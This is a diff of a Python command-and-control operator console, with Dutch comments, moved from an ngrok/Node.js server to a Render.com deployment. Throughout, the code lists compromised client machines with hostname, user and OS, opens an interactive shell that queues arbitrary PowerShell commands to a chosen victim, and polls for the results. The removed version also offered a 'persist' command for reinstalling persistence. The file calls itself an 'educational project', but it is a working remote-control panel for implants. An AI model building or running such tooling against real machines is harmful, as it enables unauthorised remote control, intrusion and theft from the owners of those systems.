@@ -1,34 +1,21 @@
 #!/usr/bin/env python3
 """
-Kali Linux C2 Controller - Node.js Server Edition
+Kali Linux C2 Controller - Render.com Edition
 Educational Cybersecurity Project
 """
 
 import requests
 import json
 import time
-import sys
 from datetime import datetime
-from typing import List, Dict, Optional
 
-# Configuratie - VERANDER DEZE
-SERVER_URL = "https://your-ngrok-url.ngrok-free.app"  # Of localhost:3000 voor lokaal
-ADMIN_TOKEN = "your-secret-token-change-this"
-
-class Colors:
-    """Terminal kleuren"""
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    END = '\033[0m'
-    BOLD = '\033[1m'
+# Configuratie - VERANDER DEZE WAARDEN
+RENDER_URL = "https://your-app-name.onrender.com"
+ADMIN_TOKEN = "YOUR_SECRET_TOKEN_HERE"  # Moet matchen met Render environment variable
 
 class C2Controller:
-    def __init__(self, server_url: str, token: str):
-        self.server_url = server_url.rstrip('/')
+    def __init__(self, render_url, token):
+        self.render_url = render_url.rstrip('/')
         self.headers = {
             'Authorization': f'Bearer {token}',
             'Content-Type': 'application/json'
@@ -36,20 +23,28 @@ class C2Controller:
         self.session = requests.Session()
         self.session.headers.update(self.headers)
     
-    def test_connection(self) -> bool:
-        """Test verbinding met server"""
+    def check_connection(self):
+        """Test verbinding met Render server"""
         try:
-            response = self.session.get(f"{self.server_url}/health", timeout=5)
-            return response.status_code == 200
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan niet verbinden met server: {e}{Colors.END}")
+            response = self.session.get(
+                f"{self.render_url}/",
+                timeout=10
+            )
+            response.raise_for_status()
+            data = response.json()
+            print(f"[✓] Verbonden met C2 server")
+            print(f"    Status: {data.get('status')}")
+            print(f"    Actieve clients: {data.get('activeClients', 0)}")
+            return True
+        except requests.exceptions.RequestException as e:
+            print(f"[✗] Kan niet verbinden met server: {e}")
             return False
     
-    def list_clients(self) -> List[Dict]:
+    def list_clients(self):
         """Lijst alle actieve clients"""
         try:
             response = self.session.get(
-                f"{self.server_url}/admin/clients",
+                f"{self.render_url}/admin/clients",
                 timeout=10
             )
             response.raise_for_status()
@@ -57,15 +52,15 @@ class C2Controller:
             return data.get('clients', [])
         except requests.exceptions.HTTPError as e:
             if e.response.status_code == 401:
-                print(f"{Colors.RED}[ERROR] Authenticatie mislukt - check je ADMIN_TOKEN{Colors.END}")
+                print(f"[ERROR] Authenticatie gefaald - controleer ADMIN_TOKEN")
             else:
-                print(f"{Colors.RED}[ERROR] HTTP {e.response.status_code}: {e}{Colors.END}")
+                print(f"[ERROR] HTTP {e.response.status_code}: {e}")
             return []
         except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan clients niet ophalen: {e}{Colors.END}")
+            print(f"[ERROR] Kan clients niet ophalen: {e}")
             return []
     
-    def send_command(self, client_id: str, command: str) -> Optional[Dict]:
+    def send_command(self, client_id, command):
         """Stuur command naar specifieke client"""
         try:
             payload = {
@@ -73,69 +68,47 @@ class C2Controller:
                 'command': command
             }
             response = self.session.post(
-                f"{self.server_url}/admin/command",
+                f"{self.render_url}/admin/command",
                 json=payload,
                 timeout=10
             )
             response.raise_for_status()
             return response.json()
         except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan command niet versturen: {e}{Colors.END}")
+            print(f"[ERROR] Kan command niet versturen: {e}")
             return None
     
-    def get_output(self, client_id: str) -> Optional[Dict]:
+    def get_output(self, client_id):
         """Haal output op van client"""
         try:
             response = self.session.get(
-                f"{self.server_url}/admin/output?id={client_id}",
+                f"{self.render_url}/admin/output?id={client_id}",
                 timeout=10
             )
             response.raise_for_status()
             return response.json()
+        except requests.exceptions.HTTPError as e:
+            if e.response.status_code == 404:
+                return None
+            print(f"[ERROR] HTTP {e.response.status_code}")
+            return None
         except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan output niet ophalen: {e}{Colors.END}")
+            print(f"[ERROR] Kan output niet ophalen: {e}")
             return None
     
-    def clear_output(self, client_id: str) -> bool:
-        """Clear output van client"""
-        try:
-            response = self.session.delete(
-                f"{self.server_url}/admin/output/{client_id}",
-                timeout=10
-            )
-            response.raise_for_status()
-            return True
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan output niet wissen: {e}{Colors.END}")
-            return False
-    
-    def get_stats(self) -> Optional[Dict]:
-        """Haal server statistieken op"""
-        try:
-            response = self.session.get(
-                f"{self.server_url}/admin/stats",
-                timeout=10
-            )
-            response.raise_for_status()
-            return response.json()
-        except Exception as e:
-            print(f"{Colors.RED}[ERROR] Kan stats niet ophalen: {e}{Colors.END}")
-            return None
-    
-    def display_clients(self, clients: List[Dict]):
+    def display_clients(self, clients):
         """Toon lijst van clients"""
         if not clients:
-            print(f"\n{Colors.YELLOW}[*] Geen actieve clients{Colors.END}")
+            print("\n[*] Geen actieve clients")
             return
         
-        print(f"\n{Colors.CYAN}{'='*80}")
-        print(f"{Colors.BOLD}ACTIEVE CLIENTS{Colors.END}")
-        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
+        print("\n" + "="*70)
+        print("ACTIEVE CLIENTS")
+        print("="*70)
         
         for idx, client in enumerate(clients, 1):
             hostname = client.get('hostname', 'Unknown')
             username = client.get('username', 'Unknown')
-            ip = client.get('ip', 'Unknown')
             last_seen = client.get('lastSeen', 0)
             
             # Bereken tijdsverschil
@@ -152,51 +125,36 @@ class C2Controller:
             else:
                 time_str = "Onbekend"
             
-            # Kleur op basis van recency
-            if last_seen and (int(time.time() * 1000) - last_seen) < 30000:
-                status_color = Colors.GREEN
-                status = "ACTIVE"
-            else:
-                status_color = Colors.YELLOW
-                status = "IDLE"
-            
-            print(f"\n{Colors.BOLD}[{idx}] {hostname}{Colors.END} {status_color}[{status}]{Colors.END}")
-            print(f"    User: {Colors.CYAN}{username}{Colors.END}")
-            print(f"    IP: {Colors.CYAN}{ip}{Colors.END}")
-            print(f"    Last Seen: {Colors.CYAN}{time_str}{Colors.END}")
+            print(f"\n[{idx}] {hostname}")
+            print(f"    User: {username}")
+            print(f"    Last Seen: {time_str}")
             
             # Toon extra data indien beschikbaar
             data = client.get('data', {})
             if isinstance(data, dict):
-                if data.get('type') == 'init':
-                    print(f"    Status: {Colors.GREEN}{data.get('message', 'Connected')}{Colors.END}")
-                elif data.get('type') == 'output':
+                if data.get('type') == 'output':
                     cmd = data.get('command', 'N/A')
                     if len(cmd) > 50:
                         cmd = cmd[:47] + "..."
-                    print(f"    Last Command: {Colors.YELLOW}{cmd}{Colors.END}")
+                    print(f"    Last Command: {cmd}")
+                elif data.get('type') == 'init':
+                    print(f"    Status: {data.get('message', 'Connected')}")
+                    if data.get('os'):
+                        print(f"    OS: {data.get('os')}")
         
-        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}\n")
+        print("\n" + "="*70)
     
-    def interactive_shell(self, client_id: str):
+    def interactive_shell(self, client_id):
         """Interactieve shell voor specifieke client"""
-        print(f"\n{Colors.GREEN}[*] Verbonden met {client_id}{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Type 'help' voor beschikbare commands{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Type 'exit' om terug te keren naar menu{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Commands worden asynchroon uitgevoerd (5s polling){Colors.END}\n")
-        
-        # Built-in commands
-        builtin_commands = {
-            'help': 'Toon deze help',
-            'exit': 'Terug naar hoofdmenu',
-            'clear': 'Clear output history',
-            'sysinfo': 'Toon systeem informatie',
-            'persist': 'Herinstalleer persistence'
-        }
+        print(f"\n[*] Verbonden met {client_id}")
+        print("[*] Type 'exit' om terug te keren naar menu")
+        print("[*] Type 'clear' om scherm te wissen")
+        print("[*] Commands worden asynchroon uitgevoerd (5s polling)")
+        print()
         
         while True:
             try:
-                command = input(f"{Colors.CYAN}{client_id}>{Colors.END} ").strip()
+                command = input(f"{client_id}> ").strip()
                 
                 if not command:
                     continue
@@ -204,117 +162,73 @@ class C2Controller:
                 if command.lower() == 'exit':
                     break
                 
-                if command.lower() == 'help':
-                    print(f"\n{Colors.BOLD}Built-in Commands:{Colors.END}")
-                    for cmd, desc in builtin_commands.items():
-                        print(f"  {Colors.GREEN}{cmd:<15}{Colors.END} - {desc}")
-                    print(f"\n{Colors.BOLD}PowerShell Commands:{Colors.END}")
-                    print(f"  Voer elke PowerShell command in (bijv: Get-Process, ls, whoami)")
-                    print()
-                    continue
-                
                 if command.lower() == 'clear':
-                    if self.clear_output(client_id):
-                        print(f"{Colors.GREEN}[+] Output history gewist{Colors.END}\n")
+                    print("\033[2J\033[H", end="")
                     continue
                 
                 # Stuur command
                 result = self.send_command(client_id, command)
                 if result:
-                    print(f"{Colors.GREEN}[+] Command in queue: {command}{Colors.END}")
-                    print(f"{Colors.YELLOW}[*] Wacht op output (max 30s)...{Colors.END}")
+                    print(f"[+] Command in queue: {command}")
+                    print("[*] Wacht op output (max 30s)...")
                     
                     # Poll voor output
-                    output_received = False
-                    for i in range(6):  # 6 x 5 seconden = 30 seconden
+                    for attempt in range(6):  # 6 x 5 seconden = 30 seconden
                         time.sleep(5)
-                        data = self.get_output(client_id)
+                        output = self.get_output(client_id)
                         
-                        if data and data.get('outputs'):
-                            outputs = data['outputs']
-                            
-                            # Zoek naar meest recente output voor dit command
-                            for output in reversed(outputs):
-                                if output.get('command') == command:
-                                    print(f"\n{Colors.CYAN}--- OUTPUT ---{Colors.END}")
-                                    
-                                    if output.get('type') == 'output':
-                                        result_text = output.get('result', 'Geen output')
-                                        print(result_text)
-                                    elif output.get('type') == 'error':
-                                        print(f"{Colors.RED}ERROR: {output.get('error', 'Unknown error')}{Colors.END}")
-                                    
-                                    print(f"{Colors.CYAN}--- END ---{Colors.END}\n")
-                                    output_received = True
-                                    break
-                            
-                            if output_received:
+                        if output and isinstance(output.get('data'), dict):
+                            data = output['data']
+                            if data.get('type') == 'output' and data.get('command') == command:
+                                print("\n--- OUTPUT ---")
+                                result_text = data.get('result', 'Geen output')
+                                # Limiteer output lengte voor leesbaarheid
+                                if len(result_text) > 5000:
+                                    print(result_text[:5000])
+                                    print(f"\n... (output truncated, {len(result_text)} chars total)")
+                                else:
+                                    print(result_text)
+                                print("--- END ---\n")
                                 break
-                        
-                        # Toon progress
-                        dots = "." * (i + 1)
-                        print(f"{Colors.YELLOW}[*] Polling{dots}{Colors.END}", end='\r')
-                    
-                    if not output_received:
-                        print(f"\n{Colors.RED}[!] Timeout - geen response ontvangen{Colors.END}\n")
+                            elif data.get('type') == 'error':
+                                print(f"\n[ERROR] {data.get('error', 'Unknown error')}\n")
+                                break
+                    else:
+                        print("[!] Timeout - geen response ontvangen")
+                        print("[!] Command kan nog steeds uitgevoerd worden\n")
                 
             except KeyboardInterrupt:
-                print(f"\n{Colors.YELLOW}[*] Onderbroken door gebruiker{Colors.END}")
+                print("\n[*] Onderbroken door gebruiker")
                 break
             except Exception as e:
-                print(f"{Colors.RED}[ERROR] {e}{Colors.END}")
-    
-    def show_stats(self):
-        """Toon server statistieken"""
-        stats = self.get_stats()
-        if stats:
-            print(f"\n{Colors.CYAN}{'='*50}")
-            print(f"{Colors.BOLD}SERVER STATISTIEKEN{Colors.END}")
-            print(f"{Colors.CYAN}{'='*50}{Colors.END}\n")
-            
-            print(f"Total Clients: {Colors.GREEN}{stats.get('totalClients', 0)}{Colors.END}")
-            print(f"Active Commands: {Colors.YELLOW}{stats.get('activeCommands', 0)}{Colors.END}")
-            print(f"Total Outputs: {Colors.CYAN}{stats.get('totalOutputs', 0)}{Colors.END}")
-            
-            uptime = stats.get('uptime', 0)
-            hours = int(uptime // 3600)
-            minutes = int((uptime % 3600) // 60)
-            print(f"Server Uptime: {Colors.GREEN}{hours}h {minutes}m{Colors.END}")
-            
-            memory = stats.get('memory', {})
-            rss_mb = memory.get('rss', 0) / 1024 / 1024
-            print(f"Memory Usage: {Colors.CYAN}{rss_mb:.2f} MB{Colors.END}")
-            
-            print(f"\n{Colors.CYAN}{'='*50}{Colors.END}\n")
+                print(f"[ERROR] {e}")
     
     def main_menu(self):
         """Hoofd menu"""
-        print(f"""
-{Colors.CYAN}╔═══════════════════════════════════════════╗
-║  KALI C2 CONTROLLER - NODE.JS EDITION    ║
-║          EDUCATIONAL PURPOSE              ║
-╚═══════════════════════════════════════════╝{Colors.END}
+        print("""
+╔═══════════════════════════════════════════╗
+║   KALI C2 CONTROLLER - RENDER EDITION     ║
+║        EDUCATIONAL PROJECT ONLY           ║
+╚═══════════════════════════════════════════╝
         """)
         
-        # Test verbinding
-        print(f"{Colors.YELLOW}[*] Testing server connection...{Colors.END}")
-        if not self.test_connection():
-            print(f"{Colors.RED}[!] Kan geen verbinding maken met server{Colors.END}")
-            print(f"{Colors.YELLOW}[*] Check of de server draait en de URL correct is{Colors.END}")
-            return
-        
-        print(f"{Colors.GREEN}[+] Verbonden met server: {self.server_url}{Colors.END}\n")
+        # Check verbinding bij start
+        if not self.check_connection():
+            print("\n[!] Kan niet verbinden met server. Controleer:")
+            print("    1. RENDER_URL in script")
+            print("    2. ADMIN_TOKEN in script")
+            print("    3. Render service is actief")
+            input("\nDruk Enter om toch door te gaan...")
         
         while True:
-            print(f"\n{Colors.BOLD}MENU:{Colors.END}")
-            print(f"{Colors.CYAN}[1]{Colors.END} Lijst actieve clients")
-            print(f"{Colors.CYAN}[2]{Colors.END} Verbind met client (interactieve shell)")
-            print(f"{Colors.CYAN}[3]{Colors.END} Stuur single command")
-            print(f"{Colors.CYAN}[4]{Colors.END} Server statistieken")
-            print(f"{Colors.CYAN}[5]{Colors.END} Refresh")
-            print(f"{Colors.CYAN}[0]{Colors.END} Exit")
+            print("\n[1] Lijst actieve clients")
+            print("[2] Verbind met client (interactieve shell)")
+            print("[3] Stuur single command")
+            print("[4] Test server verbinding")
+            print("[5] Refresh status")
+            print("[0] Exit")
             
-            choice = input(f"\n{Colors.GREEN}Keuze>{Colors.END} ").strip()
+            choice = input("\nKeuze> ").strip()
             
             if choice == '1':
                 clients = self.list_clients()
@@ -323,11 +237,11 @@ class C2Controller:
             elif choice == '2':
                 clients = self.list_clients()
                 if not clients:
-                    print(f"{Colors.YELLOW}[!] Geen actieve clients{Colors.END}")
+                    print("[!] Geen actieve clients")
                     continue
                 
                 self.display_clients(clients)
-                client_idx = input(f"\n{Colors.GREEN}Selecteer client nummer>{Colors.END} ").strip()
+                client_idx = input("\nSelecteer client nummer> ").strip()
                 
                 try:
                     idx = int(client_idx) - 1
@@ -335,19 +249,23 @@ class C2Controller:
                         client_id = clients[idx].get('hostname')
                         self.interactive_shell(client_id)
                     else:
-                        print(f"{Colors.RED}[!] Ongeldige client nummer{Colors.END}")
+                        print("[!] Ongeldige client nummer")
                 except ValueError:
-                    print(f"{Colors.RED}[!] Voer een geldig nummer in{Colors.END}")
+                    print("[!] Voer een geldig nummer in")
             
             elif choice == '3':
                 clients = self.list_clients()
                 if not clients:
-                    print(f"{Colors.YELLOW}[!] Geen actieve clients{Colors.END}")
+                    print("[!] Geen actieve clients")
                     continue
                 
                 self.display_clients(clients)
-                client_idx = input(f"\n{Colors.GREEN}Selecteer client nummer>{Colors.END} ").strip()
-                command = input(f"{Colors.GREEN}Command>{Colors.END} ").strip()
+                client_idx = input("\nSelecteer client nummer> ").strip()
+                command = input("Command> ").strip()
+                
+                if not command:
+                    print("[!] Geen command ingevoerd")
+                    continue
                 
                 try:
                     idx = int(client_idx) - 1
@@ -355,46 +273,38 @@ class C2Controller:
                         client_id = clients[idx].get('hostname')
                         result = self.send_command(client_id, command)
                         if result:
-                            print(f"{Colors.GREEN}[+] Command verstuurd naar {client_id}{Colors.END}")
+                            print(f"[+] Command verstuurd naar {client_id}")
+                            print(f"[*] Check output met optie 1 over 5-10 seconden")
                     else:
-                        print(f"{Colors.RED}[!] Ongeldige client nummer{Colors.END}")
+                        print("[!] Ongeldige client nummer")
                 except ValueError:
-                    print(f"{Colors.RED}[!] Voer een geldig nummer in{Colors.END}")
+                    print("[!] Voer een geldig nummer in")
             
             elif choice == '4':
-                self.show_stats()
+                self.check_connection()
             
             elif choice == '5':
-                print(f"{Colors.YELLOW}[*] Refreshing...{Colors.END}")
+                print("[*] Refreshing...")
                 time.sleep(1)
             
             elif choice == '0':
-                print(f"{Colors.GREEN}[*] Afsluiten...{Colors.END}")
+                print("\n[*] Afsluiten...")
                 break
             
             else:
-                print(f"{Colors.RED}[!] Ongeldige keuze{Colors.END}")
+                print("[!] Ongeldige keuze")
 
 if __name__ == "__main__":
-    print(f"{Colors.BOLD}C2 Controller v1.0{Colors.END}\n")
-    
-    # Check configuratie
-    if SERVER_URL == "https://your-ngrok-url.ngrok-free.app":
-        print(f"{Colors.RED}[!] WAARSCHUWING: SERVER_URL niet geconfigureerd!{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Edit het script en verander SERVER_URL{Colors.END}\n")
-    
-    if ADMIN_TOKEN == "your-secret-token-change-this":
-        print(f"{Colors.RED}[!] WAARSCHUWING: ADMIN_TOKEN niet veranderd!{Colors.END}")
-        print(f"{Colors.YELLOW}[*] Dit is niet veilig voor productie gebruik{Colors.END}\n")
+    print("\n[*] C2 Controller wordt gestart...")
     
     # Initialiseer controller
-    controller = C2Controller(SERVER_URL, ADMIN_TOKEN)
+    controller = C2Controller(RENDER_URL, ADMIN_TOKEN)
     
     try:
         controller.main_menu()
     except KeyboardInterrupt:
-        print(f"\n\n{Colors.GREEN}[*] Programma gestopt{Colors.END}")
+        print("\n\n[*] Programma gestopt door gebruiker")
     except Exception as e:
-        print(f"\n{Colors.RED}[FATAL ERROR] {e}{Colors.END}")
+        print(f"\n[FATAL ERROR] {e}")
         import traceback
         traceback.print_exc()
